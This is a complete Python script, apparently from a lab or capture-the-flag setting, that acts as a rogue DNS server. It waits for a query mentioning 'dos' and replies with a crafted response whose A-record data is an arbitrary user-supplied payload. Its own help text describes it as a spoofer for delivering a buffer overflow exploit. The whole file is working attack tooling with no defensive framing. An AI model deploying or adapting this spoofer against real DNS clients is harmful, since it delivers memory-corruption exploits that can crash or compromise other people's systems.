# dns_spoofer.py
import socket
import argparse

def main(payload_hex: str):
    """
    Listens on UDP port 53 for a DNS query for 'dos.com' and
    responds with a malicious payload.
    """
    payload = bytes.fromhex(payload_hex)
    ip = "127.0.0.1"
    port = 53
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind((ip, port))
    print(f"DNS Spoofer listening on {ip}:{port}...")

    try:
        # Wait for one query and then exit
        data, addr = sock.recvfrom(1024)
        domain = ""
        # Basic parsing to confirm it's our target query
        if b'dos' in data[12:]: 
            print(f"Received query for 'dos.com' from {addr}. Sending payload.")
            
            # Craft a malicious DNS response packet
            packet = bytearray()
            packet += data[:2]  # Transaction ID
            packet += b'\x81\x80'  # Flags: Standard query response, no error
            packet += b'\x00\x01'  # Questions: 1
            packet += b'\x00\x01'  # Answer RRs: 1
            packet += b'\x00\x00'  # Authority RRs: 0
            packet += b'\x00\x00'  # Additional RRs: 0
            packet += data[12:] # Original query name
            
            # Pointer to the name, Type A, Class IN, TTL, Data length
            packet += b'\xc0\x0c' 
            packet += b'\x00\x01'
            packet += b'\x00\x01'
            packet += b'\x00\x00\x00\xff'
            packet += len(payload).to_bytes(2, 'big')
            packet += payload

            sock.sendto(packet, addr)
            print("Payload sent.")
        else:
            print("Received a non-target query. Ignoring.")

    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        sock.close()
        print("DNS Spoofer shutting down.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="DNS Spoofer for Buffer Overflow Exploit")
    parser.add_argument("--payload", type=str, required=True, help="The exploit payload in hex format.")
    args = parser.parse_args()
    main(args.payload)